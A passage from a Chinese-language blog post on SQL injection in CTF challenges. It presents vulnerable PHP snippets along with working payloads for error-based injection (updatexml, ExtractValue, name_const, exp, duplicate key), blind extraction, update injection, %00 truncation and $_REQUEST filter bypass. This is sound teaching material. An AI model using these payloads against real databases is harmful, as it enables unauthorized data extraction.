class="keyword">print</span>(mysql_error());</span><br><span class="line">        $sql = <span class="string">"delete from guestbook where id=$id"</span>;</span><br><span class="line">        mysql_query($sql);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>sqli关键:需要绕过单引号和preg_match</p>
<p>因为stripcslashes函数，可以使用<code>1\x27</code>创造单引号</p>
<p><code>/*!00000select*/</code>绕过preg_match</p>
<blockquote>
<p>在mysql,00000这5位代表版本号，表示只有在大于该版本的mysql中不作为注释</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt;  /*!00000select &apos;zeroyu&apos;*/;</span><br><span class="line">+--------+</span><br><span class="line">| zeroyu |</span><br><span class="line">+--------+</span><br><span class="line">| zeroyu |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>注： <code>concat(0x27,(/*!00000select version()*/))</code>这个对于UpdateXML和ExtractValue而言会最先执行，但是它不是一个合格xml表达式，因而或造成报错。但要注意这两个报错的最大长度是32</p>
<h3 id="1-利用updatexml报错"><a href="#1-利用updatexml报错" class="headerlink" title="1.利用updatexml报错"></a>1.利用updatexml报错</h3><blockquote>
<p>UpdateXML(xml_target, xpath_expr, new_xml)<br>updatexml函数有三个参数，作用是xml替换，把xml_target中被xpath_expr匹配到的部分使用new_xml替换</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=1\x27 and updatexml(0,concat(0x27,(/*!00000select version()*/)),0)%23</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~10.1.36-MariaDB~&apos;</span><br></pre></td></tr></table></figure>
<h3 id="2-利用ExtractValue-报错"><a href="#2-利用ExtractValue-报错" class="headerlink" title="2.利用ExtractValue()报错"></a>2.利用ExtractValue()报错</h3><blockquote>
<p>ExtractValue(xml_frag, xpath_expr) 得到xml_frag中被xpath_expr匹配到的值</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=1\x27 and ExtractValue(0,concat(0x27,(/*!00000select version()*/)))%23;</span><br></pre></td></tr></table></figure>
<h3 id="3-name-const"><a href="#3-name-const" class="headerlink" title="3.name_const()"></a>3.name_const()</h3><blockquote>
<p>name_const(name,value)<br>返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。</p>
</blockquote>
<p>本题利用的是表的字段名(列名)不允许重复，列名重复会报错，报错长度没有限制</p>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27%20and%20(/*!00000SELECT*/ * FROM(/*!00000SELECT*/(name_const(version(),1)),name_const(version(),1))a)%23</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select name_const(&apos;l&apos;,&apos;f&apos;);</span><br><span class="line">+------+</span><br><span class="line">| l    |</span><br><span class="line">+------+</span><br><span class="line">| f    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//此处的a是列别名，别名使用时是可以省略as的</span><br><span class="line">MariaDB [test]&gt; /*!00000SELECT*/(name_const(version(),1)),name_const(1,version())a;</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| 10.1.30-MariaDB | a               |</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">|               1 | 10.1.30-MariaDB |</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h3><p>前提: mysql=&lt;5.5.53时才可以使用，不然不会有返回结果的</p>
<p>比如我在5.6.x下进行测试就没有返回结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select #)))&apos;</span><br></pre></td></tr></table></figure>
<p>如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的。</p>
<p>通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and (/*!00000select exp(~(/*!00000select*/ * from (/*!00000select*/ version())a)))%23</span><br></pre></td></tr></table></figure>
<p>参考:<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
<h3 id="5-主键重复"><a href="#5-主键重复" class="headerlink" title="5.主键重复"></a>5.主键重复</h3><p>concat+rand()+group_by()导致主键重复</p>
<p>。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;10.1.36-MariaDB1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure></p>
<p>floor(rand(0)<em>2)则会固定得到011011…的序列,在查询时floor(rand(0)</em>2)会被计算5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。</p>
<h3 id="6-几何函数"><a href="#6-几何函数" class="headerlink" title="6.几何函数"></a>6.几何函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</span><br></pre></td></tr></table></figure>
<p>这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行。</p>
<h3 id="7-join报错爆字段"><a href="#7-join报错爆字段" class="headerlink" title="7.join报错爆字段"></a>7.join报错爆字段</h3><p>注：该方法在知道表名的情况下使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from 表名 a join 表名 b) c)  </span><br><span class="line">在得到一个字段后，使用using得到下一个字段</span><br><span class="line">select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c</span><br></pre></td></tr></table></figure>
<h2 id="0x15-MySQL快速盲注小技巧"><a href="#0x15-MySQL快速盲注小技巧" class="headerlink" title="0x15 MySQL快速盲注小技巧"></a>0x15 MySQL快速盲注小技巧</h2><p>将字符串经过hex编码之后，再转成10进制数字，通过盲注获取具体的数字，然后再将它还原回去。</p>
<p>注意当数字过长是可以采用截取字符串的方式，八位八位的获取数据结果，公式:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure>
<p>参考：<a href="http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/" target="_blank" rel="noopener">http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/</a></p>
<h2 id="0x16-update注入"><a href="#0x16-update注入" class="headerlink" title="0x16 update注入"></a>0x16 update注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($link, <span class="string">'code'</span>);</span><br><span class="line"></span><br><span class="line">$table = addslashes($_GET[<span class="string">'table'</span>]);</span><br><span class="line">$sql = <span class="string">"UPDATE `&#123;$table&#125;` </span></span><br><span class="line"><span class="string">        SET `username`='admin'</span></span><br><span class="line"><span class="string">        WHERE id=1"</span>;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_query($link, $sql)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(mysqli_error($link));</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($link);</span><br></pre></td></tr></table></figure>
<p>关键点:</p>
<ol>
<li>update注入，且sql语句没有写在一行代码里面 =&gt; left join</li>
<li>addslashes在单引号和双引号前加”\” =&gt; 出现单引号的地方用char函数代替</li>
<li>闭合`</li>
<li>除了table表以外不知道数据库的其他表了，或者根本就只有一个表，所以我就要用mysql的虚表dual</li>
</ol>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=test` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select version()),0x7e)))) tt on tt.user=`t.username</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://paper.seebug.org/216/" target="_blank" rel="noopener">https://paper.seebug.org/216/</a></p>
<h2 id="0x17-00截断"><a href="#0x17-00截断" class="headerlink" title="0x17 %00截断"></a>0x17 %00截断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$db  = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'web_brave'</span>,<span class="string">''</span>,<span class="string">'web_brave'</span>);</span><br><span class="line"></span><br><span class="line">$id  = @$_GET[<span class="string">'id'</span>];</span><br><span class="line">$key = $db-&gt;real_escape_string(@$_GET[<span class="string">'key'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\s|[\(\)\'"\/\\=&amp;\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i'</span>, $id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Attack Detected. Try harder: '</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]); <span class="comment">// attack detected</span></span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '"</span>.$key.<span class="string">"'"</span>;</span><br><span class="line">$q = $db-&gt;query($query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($q-&gt;num_rows) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h3&gt;Users:&lt;/h3&gt;&lt;ul&gt;'</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $q-&gt;fetch_array()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;li&gt;'</span>.$row[<span class="string">'name'</span>].<span class="string">'&lt;/li&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h3&gt;Nop.&lt;/h3&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了好多但是”`”没有过滤，使用%00截断进行截断</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=`id`;%00</span><br></pre></td></tr></table></figure>
<h2 id="0x18-绕正则"><a href="#0x18-绕正则" class="headerlink" title="0x18 绕正则"></a>0x18 绕正则</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from xxx where id = '&#123;$_GET['id']&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$result = sql_query($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个题目绕正则没什么意思，主要是想再提一下<code>$_REQUEST</code>变量覆盖问题</p>
<p>数据加载的顺序:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Environment-&gt;Get-&gt;Post-&gt;Cookie-&gt;Server</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET传参</span><br><span class="line">?id=1&apos; union select * from flag %23</span><br><span class="line">同时POST传参</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
<h2 id="00-参考文章"><a href="#00-参考文章" class="headerlink" title="00.参考文章"></a>00.参考文章</h2><p><a href="https://www.cnblogs.com/REscan/p/7043705.html" target="_blank" rel="noopener">ctf中sql注入下的一些小技巧</a></p>
<p><a href="https://xz.aliyun.com/t/253#toc-0" target="_blank" rel="noopener">MYSQL报错注入的一点总结</a></p>
<p><a href="https://klionsec.github.io/2016/05/13/mysql-error-injection/" target="_blank" rel="noopener">sql注入入门 之 mysql 显错注入 [ floor()显错 ]</a></p>
<p><a href="http://www.zhutougg.com/2017/01/16/mysqlshu-ju-ku-de-12chong-bao-cuo-zhu-ru/" target="_blank" rel="noopener">MySQL数据库的12种爆错注入</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-http头xff的时间盲注"><span class="toc-number">1.</span> <span class="toc-text">0x01 http头xff的时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-异或注入xor"><span class="toc-number">2.</span> <span class="toc-text">0x02 异或注入xor/^</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-limit注入"><span class="toc-number">3.</span> <span class="toc-text">0x03 limit注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-利用insert，update和delete注入获取数据"><span class="toc-number">4.</span> <span class="toc-text">0x04 利用insert，update和delete注入获取数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05当update注入遇到关闭显错"><span class="toc-number">5.</span> <span class="toc-text">0x05当update注入遇到关闭显错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Mysql字符编码利用技巧"><span class="toc-number">6.</span> <span class="toc-text">0x06 Mysql字符编码利用技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-GBK-Injection"><span class="toc-number">7.</span> <span class="toc-text">0x07 GBK Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-MD5加密后的SQLi"><span class="toc-number">8.</span> <span class="toc-text">0x08 MD5加密后的SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-空格被过滤"><span class="toc-number">9.</span> <span class="toc-text">0x09 空格被过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-符号问题"><span class="toc-number">10.</span> <span class="toc-text">0x10 符号问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-rollup-amp-amp-offset"><span class="toc-number">11.</span> <span class="toc-text">0x11 rollup&amp;&amp;offset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-注出可控数据绕过登录"><span class="toc-number">12.</span> <span class="toc-text">0x12 注出可控数据绕过登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-htmlentities实体化单引号情况"><span class="toc-number">13.</span> <span class="toc-text">0x13 htmlentities实体化单引号情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27"><span class="toc-number">14.</span> <span class="toc-text">0x14 报错注入 &amp;&amp; /!00000select/ &amp;&amp; ‘-&gt;\x27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-利用updatexml报错"><span class="toc-number">14.1.</span> <span class="toc-text">1.利用updatexml报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-利用ExtractValue-报错"><span class="toc-number">14.2.</span> <span class="toc-text">2.利用ExtractValue()报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-name-const"><span class="toc-number">14.3.</span> <span class="toc-text">3.name_const()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-exp"><span class="toc-number">14.4.</span> <span class="toc-text">4.exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-主键重复"><span class="toc-number">14.5.</span> <span class="toc-text">5.主键重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-几何函数"><span class="toc-number">14.6.</span> <span class="toc-text">6.几何函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-join报错爆字段"><span class="toc-number">14.7.</span> <span class="toc-text">7.join报错爆字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-MySQL快速盲注小技巧"><span class="toc-number">15.</span> <span class="toc-text">0x15 MySQL快速盲注小技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-update注入"><span class="toc-number">16.</span> <span class="toc-text">0x16 update注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17-00截断"><span class="toc-number">17.</span> <span class="toc-text">0x17 %00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18-绕正则"><span class="toc-number">18.</span> <span class="toc-text">0x18 绕正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00-参考文章"><span class="toc-number">19.</span> <span class="toc-text">00.参考文章</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&text=CTF中的SQLi"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&is_video=false&description=CTF中的SQLi"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF中的SQLi&body=Check out this article: http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&name=CTF中的SQLi&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'z3r0yu';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


